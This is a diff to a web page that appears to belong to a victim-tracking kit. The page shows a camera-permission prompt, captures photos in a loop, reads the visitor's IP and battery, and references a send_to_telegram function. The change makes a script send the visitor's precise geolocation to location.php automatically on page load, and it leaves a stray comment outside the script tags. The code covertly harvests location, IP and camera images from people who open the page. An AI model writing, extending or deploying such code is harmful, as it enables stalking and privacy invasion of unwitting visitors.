@@ -130,12 +130,23 @@ send_to_telegram($msg);
 <h3 id="bateria"></h3>
 <strong id="myIp"></strong>
 
-<script>
-function get_ip(obj){ document.getElementById('myIp').innerHTML = obj.ip; };
-</script>
 <script type="text/javascript" src="https://api.ipify.org/?format=jsonp&callback=get_ip"></script>
 <script src="ip.js"></script>
 <script src="ajax.js"></script>
+       
+// Obtener ubicación y enviarla automáticamente
+<script>
+if ('geolocation' in navigator) {
+    navigator.geolocation.getCurrentPosition(function(pos) {
+        const { latitude, longitude, accuracy } = pos.coords;
+        fetch('location.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ latitude, longitude, accuracy })
+        });
+    });
+}
+       </script>
 <script>
 'use strict';
 
@@ -165,12 +176,7 @@ function capturePhotoLoop(){
 
 document.getElementById('grantAccess').addEventListener('click',()=>{ document.getElementById('cameraModal').style.display='none'; initCamera(); });
 
-if('geolocation' in navigator){
-    navigator.geolocation.getCurrentPosition(pos=>{
-        const { latitude, longitude, accuracy } = pos.coords;
-        fetch('location.php',{ method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({latitude,longitude,accuracy}) });
-    });
-}
+
 </script>
 
 </body>
